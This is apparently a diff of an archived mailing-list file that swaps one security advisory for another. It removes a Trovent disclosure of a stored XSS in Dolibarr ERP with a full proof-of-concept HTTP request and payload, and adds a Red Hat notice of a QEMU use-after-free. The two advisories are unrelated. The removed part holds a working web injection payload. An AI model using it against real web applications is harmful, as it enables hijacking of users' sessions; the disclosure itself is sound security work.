@@ -1,145 +1,30 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2021/11/10/1
-Message-ID: <OpF3Ka8B9NOKStlDWy808_uPhKQ3flbllrA6ylRDkyen9W3HMT3I3RgPBSnq7949ZRU5Xld2MRpjSmRJrWVpjBvtfdYpPHLwNRPY9Dm6orU=@trovent.io>
-Date: Wed, 10 Nov 2021 11:36:13 +0000
-From: Stefan Pietsch <s.pietsch@...vent.io>
-To: Packet Storm <submissions@...ketstormsecurity.com>, Full Disclosure <fulldisclosure@...lists.org>, oss-security <oss-security@...ts.openwall.com>
-Subject: Trovent Security Advisory 2105-02 / CVE-2021-33618: Stored cross-site scripting in Dolibarr ERP & CRM
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2021/02/05/2
+Message-ID: <17998445-94on-7r28-s21p-r5p8rp69srn@redhat.com>
+Date: Fri, 5 Feb 2021 12:45:04 +0530 (IST)
+From: P J P <ppandit@...hat.com>
+To: oss security list <oss-security@...ts.openwall.com>
+cc: Cheolwoo Myung <cwmyung@....ac.kr>
+Subject: CVE-2021-3392 QEMU: scsi: mptsas: use-after-free while processing io requests
 Content-Type: text/plain; charset=utf-8
 
-# Trovent Security Advisory 2105-02 #
-#####################################
+   Hello,
 
+A use-after-free issue was found in the Megaraid emulator of the QEMU. It 
+occurs while processing SCSI i/o requests because in case of an error 
+mptsas_free_request() does not dequeue request object 'req' from a pending 
+requests' queue. Which later gets processed resulting in the said 
+use-after-free issue. A privileged guest user may use this flaw to crash the 
+QEMU process on the host resulting in DoS scenario.
 
-Stored cross-site scripting in Dolibarr ERP & CRM
-#################################################
+Upstream patch:
+---------------
+   -> https://lists.gnu.org/archive/html/qemu-devel/2021-02/msg00488.html
 
+This issue was reported by Cheolwoo Myung of Seoul National University.
 
-Overview
-########
+Thank you.
+--
+Prasad J Pandit / Red Hat Product Security Team
+8685 545E B54C 486B C6EB 271E E285 8B5A F050 DE8D
 
-Advisory ID: TRSA-2105-02
-Advisory version: 1.0
-Advisory status: Public
-Advisory URL: https://trovent.io/security-advisory-2105-02
-Affected product: Dolibarr ERP & CRM
-Tested versions: Dolibarr 13.0.2
-Vendor: Dolibarr foundation, https://www.dolibarr.org
-Credits: Trovent Security GmbH, Nick Decker
-
-
-Detailed description
-####################
-
-Trovent Security GmbH discovered that the Dolibarr application does not escape
-"greater than" and "smaller than" characters if they are reflected in one of the
-small pop-up windows with details of the object.
-This allows an attacker to add certain custom HTML tags and attributes.
-In our PoC we used a "body" tag in conjunction with an "onpointermove" attribute
-to achieve constant execution of the inserted JavaScript code.
-
-Severity: Critical
-CVSS Score: 9.0 (CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:H)
-CWE ID: CWE-79
-CVE ID: CVE-2021-33618
-
-
-Proof of concept
-################
-
-This is the HTTP request to change the group name:
-
-REQUEST:
-
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-
-
-POST /user/group/card.php HTTP/1.1
-Host: 10.11.9.80
-User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0 -securitytest-for-dolibarr
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
-Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate
-Content-Type: multipart/form-data; boundary=---------------------------329097076628264922392755475836
-Content-Length: 950
-Origin: http://10.11.9.80
-Connection: close
-Referer: http://10.11.9.80/user/group/card.php?id=1&action=edit&token=4726524fe505b027519a535e08c11fb6
-Cookie: PHPSESSID=8s2jl8fhmbm5th8r4baasak1q2; DOLSESSID_736206a821984837877b8a6a901910d2=4jkf7smp24evfm3vvnnunj8jaq
-Upgrade-Insecure-Requests: 1
-
-- -----------------------------329097076628264922392755475836
-Content-Disposition: form-data; name="token"
-
-6585d0838337cafddc3387fcccbe9d91
-- -----------------------------329097076628264922392755475836
-Content-Disposition: form-data; name="action"
-
-update
-- -----------------------------329097076628264922392755475836
-Content-Disposition: form-data; name="backtopage"
-
-/user/group/card.php?id=1
-- -----------------------------329097076628264922392755475836
-Content-Disposition: form-data; name="id"
-
-1
-- -----------------------------329097076628264922392755475836
-Content-Disposition: form-data; name="nom"
-
-Trovent<<body onpointermove=alert(1) <>test
-- -----------------------------329097076628264922392755475836
-Content-Disposition: form-data; name="note"
-
-
-- -----------------------------329097076628264922392755475836
-Content-Disposition: form-data; name="save"
-
-Save
-- -----------------------------329097076628264922392755475836--
-
-
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-
-
-
-
-CODE:
-
-The HTML code of the site then includes the attribute in its body tag:
-
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-
-
-<body id="mainbody" class="sidebar-collapse" <="" onpointermove="alert(1)" style="margin-bottom: 26px;">
-
-<!-- Start top horizontal -->
-<div class="side-nav-vert"><div id="id-top"><div id="tmenu_tooltip" class="tmenu">
-[...]
-
-
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-
-
-Solution / Workaround
-#####################
-
-To mitigate this vulnerability, we recommend to always escape the user input
-regardless of where it is reflected. Additionally we recommend to blacklist all
-HTML tags and attributes.
-
-Fixed in Dolibarr version 14.0.0, verified by Trovent.
-
-
-History
-#######
-
-2021-05-25: Vulnerability found
-2021-05-28: CVE ID requested & received
-2021-05-31: Vendor contacted
-2021-06-02: Vendor reported the vulnerability as fixed
-2021-11-08: Add information about fixed version
-2021-11-10: Advisory published
-
-
-Download attachment "signature.asc" of type "application/pgp-signature" (856 bytes)
